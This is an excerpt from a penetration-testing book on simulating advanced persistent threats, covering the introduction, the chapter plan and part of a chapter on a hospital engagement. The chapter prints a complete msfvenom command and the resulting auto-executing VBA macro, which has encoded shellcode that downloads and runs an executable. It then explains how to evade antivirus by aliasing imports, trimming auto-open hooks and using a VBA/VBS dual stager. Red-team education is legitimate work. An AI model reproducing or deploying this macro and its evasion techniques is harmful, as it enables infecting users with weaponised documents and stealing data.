[
  {
    "start": 1,
    "end": 18,
    "text": "Advanced Penetration Testing\nHacking the World’s Most Secure Networks\nWil Allsopp\nIntroduction\nThere is an old yet erroneous belief that fortune favors the brave. Fortune has\nand always will favor the prepared. When your organization experiences a\nserious security incident (and it will), it's your level of preparedness based on\nthe understanding of the inevitability of such an event that will guide a\nsuccessful recovery. It doesn't matter if you're responsible for the security of a\nlocal community college or if you're the CISO of an international bank—this\nfact will always remain true.\nTo quote Howard Ruff, “It wasn't raining when Noah built the ark.”\nThe first step to being prepared is being aware.\nComing Full Circle\nThere has always been the impression that you have to patch your systems\nand secure your networks because hackers are scanning vast address ranges\nlooking for victims who haven't done these things and they'll take whatever\nvulnerable systems they can get. In a sense that's true—there have always\nbeen those who are satisfied with low hanging fruit. It was true back in the\n80s as well—war dialing on the PSTN and such attacks are usually trivial to\nguard against if you know what you're up against. However, if you are\nspecifically targeted by someone with time and resources, you have a problem\nof an altogether different magnitude. Put simply, gaining access to corporate\nsystems by patiently targeting the users was usually the best way to go in the\n80s and it's usually the best way now. However, the security industry, like any\nother, is constantly looking to sell “new” products and services with different\nnames and to do that, a buzzword is required. The one that stuck was\nadvanced persistent threat.\nAdvanced Persistent Threat (APT)\nWhat differentiates an APT from a more traditional intrusion is that it is\nstrongly goal-oriented. The attacker is looking for something (proprietary data\nfor example) and is prepared to be as patient as is necessary to acquire it.\nWhile I don't recommend breaking complex processes down into simple lists\nor flowcharts, all APTs generally have the following characteristics:\nInitial compromise—Usually performed or assisted by the use of social\nengineering techniques. An attack against a client will include a core\ntechnical component (such as a Java applet), but without a convincing\npretext, such an attack is usually doomed to failure. A pretext can be\nanything but is successful when tailored to the target and its employees.\nCasting a wide net to catch the low hanging fruit (to mix my metaphors) is\nnot an acceptable way to model APTs and is certainly not how your\nadversaries are doing things.\nEstablish beachhead—Ensure future access to compromised assets\nwithout needing a repeat initial intrusion. This is where Command &\nControl (C2) comes in to play and it's best to have something that you've\ncreated yourself; that you fully understand and can customize according to\nyour needs. This is a key point in this book that I make a number of times\nwhen discussing the various aspects of C2—it needs to be secure but its\ntraffic has to look legitimate. There are easy solutions to this problem.\nEscalate privileges—Gain local and ultimately domain administrator\naccess. There are many ways this can be achieved; this book will dedicate\nconsiderable space to the best and most reliable methods as well as some\nconcepts that are more subtle.\nInternal reconnaissance—Collect information on surrounding\ninfrastructure, trust relationships, and the Windows domain structure.\nSituational awareness is critical to the success of any APT.\nNetwork colonization—Expand control to other network assets using\nharvested administrative credentials or other attacks. This is also referred\nto as lateral movement, where an attacker (having established a stable\nbase of operations within the target network) will spread influence across\nthe infrastructure and exploit other hosts.\nPersist—Ensure continued control via Command & Control. Persistence\nessentially means being able to access your target whenever you want\nregardless of whether a machine is rebooted.\nComplete mission—Exfiltrate stolen data. The most important part of any\nAPT. The attacker is not interested in vandalizing systems, defacing web\npages, or stealing credit card numbers (unless any of these things\nadvances the final goal). There is always a well-defined target in mind and\nthat target is almost always proprietary data—the mission is completed\nwhen that data has been located and liberated.\nI am a penetration tester by trade (a professional “hacker,” if you like)\nworking for every possible kind of client and market vertical over the best part\nof two decades. This book speaks from that narrative. I want to show how\nconventional penetration testing is next to useless when attempting to protect\norganizations against a targeted APT attack. Only by going beyond the\nstagnant nature of contemporary penetration testing methodologies can this\nhope to be achieved. Potential adversaries today include organized crime and\nnation states—it's worth pointing out that foreign intelligence agencies (of\nany nation) are heavily invested in industrial espionage, and not just against\nhostile nations.\nNext Generation Technology\nThere are numerous technologies available that claim to be able to prevent\nAPTs, capable of blocking unknown malware. Some of these products are not\nbad and do indeed add another layer of security by providing some degree of\nbehavioral analysis—for example catching a Metasploit callback by looking at\nwhat the .exe is doing rather than relying on an antivirus signature, which\ncan be easily bypassed. However, that is trivial to model simply because the\nbehavior of such tooling is very well understood. A genuine APT will be\ncarried out by skilled threat actors capable of developing their own tools with\na very strong understanding of how modern intrusion detection and\nprevention systems work. Thus, in describing modeling techniques, I make\nheavy use of the SSH protocol as it solves a lot of problems while masking\nactivity from monitoring systems and at the same time gives the appearance\nof legitimate traffic. It is wise at this point to reflect on what an APT isn't and\nwhy. I've seen a number of organizations, commercial and otherwise, giving\nout advice and selling services based on their own flawed understanding of\nthe nature of Advanced Persistent Threat. The following article published in\nInfoWorld is as good a place as any to rebut some myths I saw in a discussion\nonline recently:\nAPT sign No. 1: Increase in elevated log-ons late at night—This is\nnonsense. Once a target has been compromised (via whatever means), the\nattacker has no need to make use of audited login methods, as they will\nhave deployed their own Command & Control infrastructure. You will not\nsee elevated log-ons late at night or at any other time.\nAuditing logs will most likely hit nothing when a skilled attacker has\nestablished his beach head. Most likely these mechanisms will be\nimmediately circumvented by the attacker.\nAPT sign No. 2: Finding widespread backdoor Trojans—\nThroughout this book I will be constantly drilling into you how ineffectual\nAV and other malware detection tools are for combating APTs. The “A”\nstands for advanced; the attackers are more than capable of developing\ntheir own tools or masking publicly available ones. If you find backdoor\nTrojans (widespread or otherwise) and they were put there by an advanced\nexternal actor, they're decoys and you were meant to find them.\nAPT sign No. 3: Unexpected information flows—“I wish every email\nclient had the ability to show where the latest user logged in to pick up\nemail and where the last message was accessed. Gmail and some other\ncloud email systems already offer this.”\nAny email system (or any other system for that matter) can record remote\nIP addresses and perform real-time analysis to detect aberrant behavior.\nHowever, if an attacker is in your network and chooses to access your\nusers' email in this manner, the source address can and will originate\nwithin your own network. This is particularly the case as man-in-the-\nbrowser attacks become more common.\nAPT sign No. 4: Discovering unexpected data bundles—Hoping\nthat you might accidentally stumble across zip files containing valuable\ndata (that have been conveniently left for you to find) is a poor way to\napproach information security. While such a find might well be an\nIndicator of Compromise (IoC), it is neither reliable nor repeatable. You\nshould assume that if an attacker is able to enter your network and steal\nyour most valuable data, they know how to use the Delete command.\nAPT sign No. 5: Detecting pass-the-hash hacking tools—I'm not\nsure why “pass-the-hash” hacking tools were singled out for special\nattention—particularly as (generally) they don't tend to exist in isolation,\nbut as part of hacking frameworks. Nonetheless, while the presence of any\nsuch tooling could be considered an IoC, you will learn in this book that\nleaving detectable hacking software lying around on compromised\nmachines is simply not how this is done. Stealth and patience are the\nhallmarks of an APT.\n“Hackers”\nThe demographic of what we consider to be “hackers” has changed beyond all\nrecognition so this introduction will be the last time I use that word. It is\noutdated and outmoded and the connotations it conjures up are completely\ninaccurate. I prefer the more neutral terms, “attacker” or “external actor,”\nbecause as you will learn, there are far worse things out there than teenage\nanarchists with too much time on their hands. The “Golden Age” of hacking\nwhose anti-heroes were Mark Abene, Kevin Poulsen, Kevin Mitnick, and\nothers was an incredibly innocent time compared to today, where the reality is\nstranger than the cyberpunk fiction of the 1980s that inspired so many\nhackers of the day.\nIt's been a busy couple of years. The Snowden revelations shocked the world\nand directly led to wide-sweeping changes in the tech industry's attitude\ntoward security. In 2013, I had a conversation with a client that would have\nbeen unthinkable prior to the leaks—a conversation where the NSA was the\nvillain they wanted to be protected against. This was a globally respected\nFortune 500 company, not the mob. Intellectual property theft is on the rise\nand increasing in scale. In my line of work I am in a unique position to say\nwith certainty that the attacks you hear about are just the ones that are leaked\nto the media. They are the tip of the iceberg compared to the stuff that goes\nunreported. I see it on a daily basis. Unfortunately for the wider tech industry,\nbreaking in to target systems (and I'd include penetration testing here, when\nit's conducted properly) is a lot easier than keeping systems secure from\nattack. The difference between secure and vulnerable is as simple as one\nindividual in a company of thousands making one small mistake.\nForget Everything You Think You Know About\nPenetration Testing\nNothing is really secure. If there is one lesson to take away then it should be\nthat—a determined attacker is always going to be at an advantage, and (with\nvery few exceptions) the larger an enterprise gets, the more insecure it\nbecomes. There's more to monitor, more points of ingress and egress,\nboundaries between business units become blurred, and naturally there are\nmore users. Of course, that doesn't mean you should give up hope, but the\nconcept of “security through compliance” is not enough.\nDespite the obvious benefits of this kind of holistic or open-scope testing, it is\nrarely performed in the real world, at least in comparison to traditional\npenetration testing. The reason for this is twofold: it is perceived to be more\nexpensive (it isn't) and organizations rarely want that level of scrutiny. They\nwant to do just enough to comply with their security policies and their legal\nstatutory requirements. You hear terms like HIPAA-, SOX-, or PCI-compliant\nbandied about by vendors as though they mean something, but they exist only\nto keep lawyers happy and well paid and it is an easy package to sell. You can\nbe PCI compliant and be vulnerable as hell. Ask T.J. Maxx or Sony: it took the\nformer years to recover brand confidence; the vast amount of data leaked\nmeans that the damage to the latter is still being assessed. Suffice it to say\nthat a compliance mentality is harmful to your security. I'm really driving the\npoint home here because I want to make sure it is fully understood.\nCompliance with a security policy and being secure are not the same thing.\nHow This Book Is Organized\nIn this book, as stated, I'm going to examine APT modeling in the real world,\nbut I'm also going to go a little further than that. I will present a working APT\ntesting framework and in each chapter will add another layer of functionality\nas needed to solve different problems and apply the result to the target\nenvironments in discussion. In doing so, I will be completely code-agnostic\nwhere possible; however, a solid knowledge of programming is essential as\nyou will be required to create your own tools—sometimes in languages you\nmay be unfamiliar with.\nEach of the chapters of this book discusses my experience of APT modeling\nagainst specific industries. As such, each chapter introduces new concepts,\nnew ideas, and lessons to take away. I believe it's valuable to break this work\ndown by industry as environments, attitudes to security, and indeed the\ncompetence of those performing network defense varies widely across\ndifferent sectors. If you are a pen tester, you will learn something. If you have\nthe unenviable task of keeping intruders out of your organization's system,\nyou will learn things that will keep you up at night but also show you how to\nbuild more resilient defenses.\nRather than approach the subject matter as a dry technical manual, each\nchapter follows a similar format—the context of a wide range of separate\nindustries will be the background against which new technologies, attacks,\nand themes are explored. This includes not only successful vectors of attack\nbut such vital concepts as privilege escalation, avoiding malware detection,\nsituation awareness, lateral movement, and many more skills that are critical\nto a successful understanding of both APT and how to model it. The goal is\nnot simply to provide a collection of code and scripts, although many\nexamples are given, but to encourage a broad and organic understanding of\nthe problems and their solutions so that the readers will think about them in\nnew ways and be able to confidently develop their own tools.\nChapter 1, “Medical Records (In)Security,” discusses attacks to hospital\ninfrastructure with concepts such as macro attacks and man-in-the-\nbrowser techniques. Introduction to Command & Control (C2) is explored.\nChapter 2, “Stealing Research,” will explore attacks using Java Applets and\nmore advanced C2 within the context of an attack against a research\nuniversity.\nChapter 3, “Twenty-First Century Heist,” considers ways of penetrating\nhigh-security targets such as banks and highly advanced C2 techniques\nusing the DNS protocol.\nChapter 4, “Pharma Karma,” examines an attack against a pharmaceutical\ncompany and against this backdrop introduces client-side exploits and\nintegrating third-party frameworks such as Metasploit into your C2.\nChapter 5, “Guns and Ammo,” examines ransomware simulation and\nusing Tor hidden services to mask the physical location of the C2\ninfrastructure.\nChapter 6, “Criminal Intelligence,” uses the backdrop of an intrusion\nagainst a police HQ to illustrate the use of “creeper” boxes for long-term\nengagements where temporary physical access is possible. Other concepts\nsuch as privilege escalation and deploying attacks using HTML\napplications are introduced.\nChapter 7, “War Games,” discusses an attack against a classified data\nnetwork and explains concepts such as open source intelligence gathering\nand advanced concepts in Command & Control.\nChapter 8, “Hack Journalists,” shows how to attack a publisher and use\ntheir own technologies and workflows against them. Emerging rich media\ncontent and experimental C2 methodologies are considered. Advanced\nconcepts in social engineering are introduced.\nChapter 9, “Northern Exposure,” is a hypothetical attack against a hostile\nrogue state by a government Tailored Access Operations (TAO) team.\nNorth Korea is used as a convenient example. We discuss advanced\ndiscreet network mapping and means of attacking smartphones, including\nthe creation of hostile code for iOS and Android phones.\nSo, without further ado—on with the show.\nChapter 1\nMedical Records (In)security\nThis first chapter shows how the simplest of attacks can be used to\ncompromise the most secure data, which makes it a logical place to start,\nparticularly as the security of medical data has long been an issue that's\nkeeping the CIOs of hospitals awake at night.\nTHE “KANE” INCIDENT\nThe theft or even alteration of patient data had been a looming menace\nlong before Dutchman “Kane” compromised Washington University's\nMedical Center in 2000. The hospital at the time believed they had\nsuccessfully detected and cut off the attack, a belief they were rudely\ndisabused of six months later when Kane shared the data he'd taken with\nSecurity Focus journalist Kevin Poulsen, who subsequently published an\narticle describing the attack and its consequences. This quickly became\nglobal news. Kane was able to stay hidden in the Medical Center networks\nby allowing his victims to believe they had expelled him. He did this by\nleaving easily discoverable BO2K Remote Access Trojans (a tool\ndeveloped by the hacker group, “Cult of the Dead Cow” and popular\naround the turn of the century) on several of the compromised servers\nwhile his own command and control infrastructure was somewhat more\ndiscrete. The entire episode is well documented online and I suggest you\nread up on it, as it is both an excellent example of an early modern APT\nand a textbook case of how not to deal with an intrusion—procedurally\nand publicly.\nSee the original article at http://www.securityfocus.com/news/122\nAn Introduction to Simulating Advanced Persistent\nThreat\nAPT threat modeling is a specific branch of penetration testing where attacks\ntend to be focused on end users to gain initial network compromise rather\nthan attacking external systems such as web applications or Internet-facing\nnetwork infrastructure. As an exercise, it tends to be carried out in two main\nparadigms—preventative, that is, as part of a penetration testing initiative, or\npostmortem, in order to supplement a post-incident forensics response to\nunderstand how an intruder could have obtained access. The vast majority are\nof the former. APT engagements can be carried out as short-term exercises\nlasting a couple of weeks or over a long period of time, billed at an hour a day\nfor several months. There are differences of opinion as to which strategy is\nmore effective (and of course it depends on the nature of the target). On one\nhand a longer period of time allows the modeling to mimic a real-world attack\nmore accurately, but on the other, clients tend to want regular updates when\ntesting is performed in this manner and it tends to defeat the purpose of the\ntest when you get cut off at every hurdle. Different approaches will be\nexamined throughout this book.\nBackground and Mission Briefing\nA hospital in London had been compromised by parties unknown.\nThat was the sum total of what I knew when I arrived at the red brick campus\nto discuss the compromise and recommend next actions. After introductions\nand the usual bad machine coffee that generally accompanies such meetings,\nwe got to the heart of the matter. Our host cryptically said that there was “an\nanomaly in the prescription medication records system.” I wasn't sure what to\nmake of that, “Was it a Nurse Jackie thing?” I asked. I was rewarded with a\nlook that said “You're not funny and I don't watch Showtime.” She continued,\n“We discovered that a number of fake patient records had been created that\nwere subsequently used to obtain controlled medications.”\nYes. I'd certainly characterize that as an anomaly.\nWe discussed the attack and the patient record system further—its pros and\ncons—and with grim inevitability, it transpired that the attacks had occurred\nfollowing a drive to move the data to the cloud. The hospital had implemented\na turnkey solution from a company called Pharmattix. This was a system that\nwas being rolled out in hospitals across the country to streamline healthcare\nprovision in a cost-effective subscription model.\nIn essence, the technology looked like Figure 1.1.\nFigure 1.1: Pharmattix network flow\nThe system had four classes of users (see Figure 1.2):\nFigure 1.2: User roles\nThe MD prescribing the medications\nThe pharmacy dispensing the medications\nThe patients themselves\nThe administrative backend for any other miscellaneous tasks\nIt's always good to find out what the vendor themselves have to say so that\nyou know what functionality the software provides.\nPHARMATTIX MARKETING MATERIAL\nWe increase the accessibility and the productivity of your practice.\nWe can provide a professional website with medical information and\nvarious forms offering your patients extra service without additional\nfinancial overhead. We can deliver all the functionality of your current\nmedical records system and can import your records and deliver a working\nsolution, many times within one working day.\nOur full service makes it easy for you as a doctor to maintain your\nwebsite. Your Pharmattix Doctor Online solution offers a website that\nallows you to inform patients and can offer additional services, while\nsaving time.\nMake your practice and patient management easier with e-consultation\nand integration with your HIS!\nFor your website capabilities:\nOwn management environment • Individual pages as team route,\nappointments, etc. • Hours • NHG Patient Leaflets and letters • MS\nOffice integration • Medical information • Passenger and vaccination\ninformation • Various forms (registration, repeat prescriptions,\nquestions) • e-consultation • Online web calendar • A link to the\nwebsite with your GP Information System (HIS) • Free helpdesk\nsupport\nE-Consultation and HIS integration: Want to communicate over a\nsecure environment with your patients? Through an e-consultation\nyou can. You can increase the accessibility of your practice without\nlosing control. It is also possible to link your HIS to the practice site,\nallowing patients to make online appointments and request repeat\nmedication. Without the intervention of the assistant!\nTo learn more, please feel free to contact us!\nMy goal as a penetration tester will be to target one of the hospital employees\nin order to subvert the patient records system. It makes sense to target the\nMDs themselves, as their role in the system permits them to add patients and\nprescribe medications, which is in essence exactly what we want to do. We\nknow from tech literature that it integrates with MS Office and, given the\nopen nature of the environment we will be attacking, that sounds like an\nexcellent place to start.\nWHEN BRUCE SCHNEIER TALKS, IT'S A GOOD IDEA\nTO LISTEN\n“Two-factor authentication isn't our savior. It won't defend against\nphishing. It's not going to prevent identity theft. It's not going to secure\nonline accounts from fraudulent transactions. It solves the security\nproblems we had 10 years ago, not the security problems we have today.”\nBruce Schneier\nEach user role used two-factor authentication; that is to say that in addition to\na username or pass, hospital workers were required to possess an access card.\nPatients also received a one-time password via SMS or email at login time.\nA recurring theme in every chapter will be to introduce a new means of\npayload delivery as well as suggest enhancements to the command and\ncontrol infrastructure. With that in mind, the first means of payload delivery I\nwant to discuss is also one of the oldest and most effective.\nPayload Delivery Part 1: Learning How to Use the VBA\nMacro\nVBA (Visual Basic for Applications) is a subset of Microsoft's proprietary\nVisual Basic programming language. It is designed to run solely within\nMicrosoft Word and Excel in order to automate repetitive operations and\ncreate custom commands or toolbar buttons. It's a primitive language as these\nthings go, but it is capable of importing outside libraries including the entire\nWindows API. As such we can do a lot with it besides drive spreadsheets and\nmanage mailing lists.\nThe VBA macro has a long history as a means of delivering malware, but that\ndoesn't mean it is any less effective today than it's ever been. On the contrary,\nin modern versions of Microsoft Office (2010 onward), the default behavior of\nthe application is to make no distinction between signed and unsigned code.\nThere are two reasons for this. The first is that code-signing is about as\neffective as rain dancing as a means of blocking hostile code and because\nMicrosoft got tired warning people of the dangers of using its core scripting\ntechnologies.\nIn this instance, we want to create a stager that executes a payload when the\ntarget opens the Word or Excel document. There are a number of ways that\nwe can achieve this but first I want to touch on some example code that is\ngenerated by the Metasploit framework by virtue of its msfvenom tool. The\nreason being simply because it is a perfect example of how not to do this.\nHow NOT to Stage a VBA Attack\nThe purpose of msfvenom is to create encoded payloads or shellcode capable of\nbeing executed on a wide range of platforms—these are generally Metasploit's\nown agents, although there are options to handle third-party code, such as\nTrojan existing executables and so forth. We'll talk later about Metasploit's\nhandlers, their strengths and weaknesses, but for now let's keep things\ngeneric. One possibility msfvenom provides is to output the resulting payload\nas decimal encoded shellcode within a VBA script that can be imported\ndirectly into a Microsoft Office document (see Listing 1-1). The following\ncommand line will create a VBA script that will download and execute a\nWindows executable from a web URL:\nListing 1-1 msfvenom-generated VBA macro code\nroot@wil:~# msfvenom -p windows/download_exec -f vba -e shikata-\nga-nai -i 5 -a x86 --platform Windows EXE=c:\\temp\\payload.exe\nURL=http://www.wherever.com\nPayload size: 429 bytes\n#If Vba7 Then\nPrivate Declare PtrSafe Function CreateThread Lib \"kernel32\"\n(ByVal Zdz As Long, ByVal Tfnsv As Long, ByVal Kyfde As LongPtr,\nSpjyjr As Long, ByVal Pcxhytlle As Long, Coupxdxe As Long) As\nLongPtr\nPrivate Declare PtrSafe Function VirtualAlloc Lib \"kernel32\"\n(ByVal Hflhigyw As Long, ByVal Zeruom As Long, ByVal Rlzbwy As\nLong, ByVal Dcdtyekv As Long) As LongPtr\nPrivate Declare PtrSafe Function RtlMoveMemory Lib \"kernel32\"\n(ByVal Kojhgx As LongPtr, ByRef Und As Any, ByVal Issacgbu As\nLong) As LongPtr\n#Else\nPrivate Declare Function CreateThread Lib \"kernel32\" (ByVal Zdz As\nLong, ByVal Tfnsv As Long, ByVal Kyfde As Long, Spjyjr As Long,\nByVal Pcxhytlle As Long, Coupxdxe As Long) As Long\nPrivate Declare Function VirtualAlloc Lib \"kernel32\" (ByVal\nHflhigyw As Long, ByVal Zeruom As Long, ByVal Rlzbwy As Long,\nByVal Dcdtyekv As Long) As Long\nPrivate Declare Function RtlMoveMemory Lib \"kernel32\" (ByVal\nKojhgx As Long, ByRef Und As Any, ByVal Issacgbu As Long) As Long\n#EndIf\nSub Auto_Open()\nDim Hdhskh As Long, Wizksxyu As Variant, Rxnffhltx As Long\n#If Vba7 Then\nDim Qgsztm As LongPtr, Svfb As LongPtr\n#Else\nDim Qgsztm As Long, Svfb As Long\n#EndIf\nWizksxyu =\nArray(232,137,0,0,0,96,137,229,49,210,100,139,82,48,139,82,12,139,82,20,\n_\n139,114,40,15,183,74,38,49,255,49,192,172,60,97,124,2,44,32,193,207,\n_\n13,1,199,226,240,82,87,139,82,16,139,66,60,1,208,139,64,120,133,192,\n_\n116,74,1,208,80,139,72,24,139,88,32,1,211,227,60,73,139,52,139,1,\n_\n214,49,255,49,192,172,193,207,13,1,199,56,224,117,244,3,125,248,59,125,\n_\n36,117,226,88,139,88,36,1,211,102,139,12,75,139,88,28,1,211,139,4,\n_\n139,1,208,137,68,36,36,91,91,97,89,90,81,255,224,88,95,90,139,18,\n_\n235,134,93,104,110,101,116,0,104,119,105,110,105,137,230,84,104,76,119,38,\n_\n7,255,213,49,255,87,87,87,87,86,104,58,86,121,167,255,213,235,96,91,\n_\n49,201,81,81,106,3,81,81,106,80,83,80,104,87,137,159,198,255,213,235,\n_\n79,89,49,210,82,104,0,50,96,132,82,82,82,81,82,80,104,235,85,46, _\n59,255,213,137,198,106,16,91,104,128,51,0,0,137,224,106,4,80,106,31,\n_\n86,104,117,70,158,134,255,213,49,255,87,87,87,87,86,104,45,6,24,123,\n_\n255,213,133,192,117,20,75,15,132,113,0,0,0,235,209,233,131,0,0,0,\n_\n232,172,255,255,255,0,235,107,49,192,95,80,106,2,106,2,80,106,2,106,\n_\n2,87,104,218,246,218,79,255,213,147,49,192,102,184,4,3,41,196,84,141,\n_\n76,36,8,49,192,180,3,80,81,86,104,18,150,137,226,255,213,133,192,116,\n_\n45,88,133,192,116,22,106,0,84,80,141,68,36,12,80,83,104,45,87,174,\n_\n91,255,213,131,236,4,235,206,83,104,198,150,135,82,255,213,106,0,87,104,\n_\n49,139,111,135,255,213,106,0,104,240,181,162,86,255,213,232,144,255,255,255,\n_\n99,58,100,97,118,101,46,101,120,101,0,232,19,255,255,255,119,119,119,46,\n_\n98,111,98,46,99,111,109,0)\nQgsztm = VirtualAlloc(0, UBound(Wizksxyu), &H1000, &H40)\nFor Rxnffhltx = LBound(Wizksxyu) To UBound(Wizksxyu)\nHdhskh = Wizksxyu(Rxnffhltx)\nSvfb = RtlMoveMemory(Qgsztm + Rxnffhltx, Hdhskh, 1)\nNext Rxnffhltx\nSvfb = CreateThread(0, 0, Qgsztm, 0, 0, 0)\nEnd Sub\nSub AutoOpen()\nAuto_Open\nEnd Sub\nSub Workbook_Open()\nAuto_Open\nEnd Sub\nThis code has been thoughtfully obfuscated by the tool (function names and\nvariables have been generated randomly) and the shellcode itself has been\nencoded using several iterations of the shikata-ga-nai algorithm. Nonetheless,\nthis code will light up like a Christmas tree the moment it comes into contact\nwith any kind of malware detection or virus scanner. By way of\ndemonstration, we take this code, import it into a Word document, and see\nhow easily it can be detected (see Figure 1.3).\nFigure 1.3: VBA exploit code imported into MS Word.\nSave this Word doc as a macro-enabled document, as shown in Figure 1.4.\nFigure 1.4: Saving for initial antivirus proving.\nIf we upload this document to the aggregate virus scanning website\nwww.virustotal.com we can see how it holds up to the analysis of 54 separate\nmalware databases, as shown in Figure 1.5.\nFigure 1.5: This demonstrates an unacceptably high AV hit rate.\n48 hits out of 54 AV engines? Not nearly good enough.\nVirusTotal also provides some heuristic information that hints as to how\nthese results are being derived, as shown in Figure 1.6.\nFigure 1.6: Additional information.\nWithin the Tags section, we see our biggest offenders: auto-open and code\ninjection. Let's pull the VBA code apart section by section and see what we can\ndo to reduce our detection footprint. If we know in advance what AV solution\nthe target is running, so much the better, but your goal should be nothing less\nthan a detection rate of zero.\nExamining the VBA Code\nIn the function declaration section, we can see three functions being imported\nfrom kernel32.dll. The purpose of these functions is to create a process\nthread, allocate memory for the shellcode, and move the shellcode into that\nmemory space. Realistically, there is no legitimate need for this functionality\nto be made available in macro code that runs inside a word processor or a\nspreadsheet. As such (and given their necessity when deploying shellcode),\ntheir presence will often be enough to trigger malware detection.\nPrivate Declare PtrSafe Function CreateThread Lib \"kernel32\" (ByVal\nZdz As Long, ByVal Tfnsv As Long, ByVal Kyfde As LongPtr, Spjyjr As\nLong, ByVal Pcxhytlle As Long, Coupxdxe As Long) As LongPtr\nPrivate Declare PtrSafe Function VirtualAlloc Lib \"kernel32\" (ByVal\nHflhigyw As Long, ByVal Zeruom As Long, ByVal Rlzbwy As Long, ByVal\nDcdtyekv As Long) As LongPtr\nPrivate Declare PtrSafe Function RtlMoveMemory Lib \"kernel32\" (ByVal\nKojhgx As LongPtr, ByRef Und As Any, ByVal Issacgbu As Long) As\nLongPtr\nDo note however, that a lot of virus scanners won't scan the declaration\nsection, only the main body of code, which means you can alias a function\nimport, for instance, as:\nPrivate Declare PtrSafe Function CreateThread Lib \"kernel32\" Alias\n\"CTAlias\" (ByVal Zdz As Long, ByVal Tfnsv As Long, ByVal Kyfde As\nLongPtr, Spjyjr As Long, ByVal Pcxhytlle As Long, Coupxdxe As Long)\nAs LongPtr\nand call only the alias itself in the body of the code. This is actually sufficient\nto bypass a number of AV solutions, including Microsoft's Endpoint\nProtection.\nAvoid Using Shellcode\nStaging the attack as shellcode is convenient, but can be easily detected.\nWizksxyu =\nArray(232,137,0,0,0,96,137,229,49,210,100,139,82,48,139,82,12,139,82,20,\n_\n139,114,40,15,183,74,38,49,255,49,192,172,60,97,124,2,44,32,193,207,\n_\n13,1,199,226,240,82,87,139,82,16,139,66,60,1,208,139,64,120,133,192,\n_\n116,74,1,208,80,139,72,24,139,88,32,1,211,227,60,73,139,52,139,1,\n_\n214,49,255,49,192,172,193,207,13,1,199,56,224,117,244,3,125,248,59,125,\n_\n36,117,226,88,139,88,36,1,211,102,139,12,75,139,88,28,1,211,139,4, _\n139,1,208,137,68,36,36,91,91,97,89,90,81,255,224,88,95,90,139,18,\n_\n235,134,93,104,110,101,116,0,104,119,105,110,105,137,230,84,104,76,119,38,\n_\n7,255,213,49,255,87,87,87,87,86,104,58,86,121,167,255,213,235,96,91,\n_\n49,201,81,81,106,3,81,81,106,80,83,80,104,87,137,159,198,255,213,235,\n_\n79,89,49,210,82,104,0,50,96,132,82,82,82,81,82,80,104,235,85,46,\n_\n59,255,213,137,198,106,16,91,104,128,51,0,0,137,224,106,4,80,106,31,\n_\n86,104,117,70,158,134,255,213,49,255,87,87,87,87,86,104,45,6,24,123,\n_\n255,213,133,192,117,20,75,15,132,113,0,0,0,235,209,233,131,0,0,0,\n_\n232,172,255,255,255,0,235,107,49,192,95,80,106,2,106,2,80,106,2,106,\n_\n2,87,104,218,246,218,79,255,213,147,49,192,102,184,4,3,41,196,84,141,\n_\n76,36,8,49,192,180,3,80,81,86,104,18,150,137,226,255,213,133,192,116,\n_\n45,88,133,192,116,22,106,0,84,80,141,68,36,12,80,83,104,45,87,174, _\n91,255,213,131,236,4,235,206,83,104,198,150,135,82,255,213,106,0,87,104,\n_\n49,139,111,135,255,213,106,0,104,240,181,162,86,255,213,232,144,255,255,255,\n_\n99,58,100,97,118,101,46,101,120,101,0,232,19,255,255,255,119,119,119,46,\n_\n98,111,98,46,99,111,109,0)\nWe can encode this in a number of ways using a number of iterations to\nensure that it doesn't trigger an AV signature and that's great; that works fine.\nThe problem is that doesn't alter the fact that it is still obviously shellcode. An\narray of bytes (despite being coded here as decimal rather than the more\nfamiliar hexadecimal) is going to look suspicious to AV and is most likely\ngoing to trigger a generic shellcode warning. Additionally, modern antivirus\nsoftware is capable of passing compiled code (including shellcode) into a\nmicro-virtual machine to test heuristically. It then doesn't matter how it's\nencoded—the AV is going to be able to see what it's doing. It makes sense for\nmsfvenom to wrap its attacks up like this because then it can deploy all of its\nmany payloads in one VBA script, but for a serious APT engagement it's not\nnearly covert enough. It's possible to encode this array in a number of ways\n(for instance as a Base64 string) and then reconstruct it at runtime, but this\ndoesn't reduce AV hit count enough to be generally worth the effort.\nThe next block of code contains the function calls themselves:\nQgsztm = VirtualAlloc(0, UBound(Wizksxyu), &H1000, &H40)\nFor Rxnffhltx = LBound(Wizksxyu) To UBound(Wizksxyu)\nHdhskh = Wizksxyu(Rxnffhltx)\nSvfb = RtlMoveMemory(Qgsztm + Rxnffhltx, Hdhskh,\nNext Rxnffhltx\nSvfb = CreateThread(0, 0, Qgsztm, 0, 0, 0)\nNothing much to add here except that functions VirtualAlloc, RtlMoveMemory,\nand CreateThread are inherently suspicious and are going to trigger AV no\nmatter how innocent the rest of your code. These functions will be flagged\neven if there is no shellcode payload present.\nAutomatic Code Execution\nThe last point I want to make concerns the overly egregious use of auto-open\nfunctionality. This function ensures your macro will run the moment the user\nconsents to enable content. There are three different ways to do this\ndepending on whether your macro is running in a Word document, an Excel\nspreadsheet, or an Excel Workbook. The code is calling all three to ensure that\nwhatever application you paste it into, the code will fire. Again, there is no\nlegitimate need to do this. As a macro developer, you should know which\nenvironment you are coding for.\nThe default subroutine is called by Word and contains our payload:\nSub Auto_Open\nMain block of code\nEnd Sub\nThe other two functions are called by Excel and simply point back to Word's\nAuto_Open function.\nSub AutoOpen()\nAuto_Open\nEnd Sub\nand\nSub Workbook_Open()\nAuto_Open\nEnd Sub\nUse of one auto-open subroutine is suspicious, use of all three will almost\ncertainly be flagged. Just by removing the latter two calls for a Word\ndocument, we can immediately reduce our AV hit rate. Removing all three\nreduces that count even further.\nThere are native functions within VBA that allow an attacker to download and\nexecute code from the Internet (the Shell and URLDownLoadToFile functions,\nfor example); however, these are subject to the same issues we've seen here–\nthey are suspicious and they are going to get flagged.\nThe bottom line is that antivirus/malware detection is extremely unforgiving\nto MS Office macros given their long history of being used to deliver payloads.\nWe therefore need to be a little more creative. What if there was a way to\ndeploy an attack to disk and execute it without the use of shellcode and\nwithout the need for VBA to actively download and execute the code itself?\nUsing a VBA/VBS Dual Stager\nWe can solve this problem by breaking our stager down into two parts. Enter\nthe Windows Scripting Host—also a subset of the Visual Basic language.\nWhere VBA is only ever used within Office documents, VBS is a standalone\nscripting language analogous to Python or Ruby. It is designed and indeed\nrequired to do much more complex tasks than automating functionality\nwithin MS Office documents. It is therefore given a much greater latitude by\nAV. Like VBA, VBS is an interpreted non-compiled language and code can be\ncalled from a simple text file. It is a viable attack therefore to deploy an\ninnocent-looking VBA macro that will carry a VBS payload, write it to file, and\nexecute it. The heavy lifting will then be performed by the VBS code. 